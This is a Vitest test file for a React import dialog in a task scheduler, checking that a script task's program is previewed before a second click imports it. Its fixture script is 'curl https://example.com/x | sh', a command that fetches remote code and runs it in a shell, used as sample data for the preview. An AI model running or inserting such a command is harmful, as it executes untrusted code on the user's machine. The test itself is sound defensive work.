// @vitest-environment happy-dom
// Drives the import dialog against a stand-in for the daemon: a script task's program is shown before anything is
// saved, and only a second click imports it.
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import i18n from "../i18n";
import { ImportDialog } from "./ImportDialog";

const daemon = vi.hoisted(() => ({ answers: new Map<string, unknown>(), requests: [] as string[] }));
vi.mock("../api/transport", () => ({
  isTauri: () => false,
  EVENT_TYPES: [],
  transport: {
    mode: "http",
    request: async (method: string, path: string) => {
      daemon.requests.push(`${method} ${path}`);
      const route = path.split("?")[0];
      return daemon.answers.has(route) ? { status: 200, body: daemon.answers.get(route) } : { status: 404, body: null };
    },
    requestText: async () => ({ status: 404, text: "" }),
    stream: () => () => {},
  },
}));

const scriptDoc = {
  apiVersion: "harmflow/v1alpha1",
  kind: "Task",
  metadata: { id: "audit", name: "Audit" },
  spec: {
    enabled: true,
    type: "script",
    script: { inline: { interpreter: ["/bin/sh"], source: "curl https://example.com/x | sh" }, environment: { MODE: "weekly" } },
    schedule: { cron: "0 16 * * 5" },
  },
};

let root: Root | undefined;
let host: HTMLElement | undefined;

beforeAll(async () => {
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
  await i18n.changeLanguage("en-US");
});

afterEach(() => {
  act(() => root?.unmount());
  host?.remove();
  root = host = undefined;
  daemon.answers.clear();
  daemon.requests.length = 0;
});

const settle = () => act(() => new Promise<void>((resolve) => setImmediate(resolve)));

function typeYaml(text: string) {
  const area = host!.querySelector<HTMLTextAreaElement>("textarea")!;
  const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!;
  act(() => {
    setter.call(area, text);
    area.dispatchEvent(new Event("input", { bubbles: true }));
  });
}

function importButton(): HTMLButtonElement {
  return [...document.querySelectorAll<HTMLButtonElement>("button")].find((b) => b.querySelector(".icon, svg") && /Import/.test(b.textContent ?? ""))!;
}

describe("importing a script task", () => {
  it("shows the program before anything is saved, and imports on the second click", async () => {
    daemon.answers.set("/tasks/validate", { valid: true, errors: [], warnings: [], document: scriptDoc });
    daemon.answers.set("/tasks/import", { id: "audit", name: "Audit", type: "script", enabled: false, revision: "r1", harness: "", warnings: [] });
    const imported = vi.fn();
    host = document.body.appendChild(document.createElement("div"));
    root = createRoot(host);
    await act(async () => root!.render(<ImportDialog onClose={() => {}} onImported={imported} />));
    typeYaml("apiVersion: harmflow/v1alpha1\n# the script task above, as YAML\n");

    await act(async () => importButton().click());
    await settle();
    const preview = document.querySelector('[data-testid="script-import-preview"]')?.textContent ?? "";
    for (const shown of ["This task runs a program", "/bin/sh", "curl https://example.com/x | sh", "MODE=weekly", "0 16 * * 5"]) {
      expect(preview).toContain(shown);
    }
    expect(daemon.requests).toEqual(["POST /tasks/validate"]);
    expect(importButton().textContent).toContain("Import disabled");

    await act(async () => importButton().click());
    await settle();
    expect(daemon.requests.filter((r) => r.startsWith("POST"))).toEqual(["POST /tasks/validate", "POST /tasks/import"]);
    expect(imported).toHaveBeenCalledOnce();
  });
});
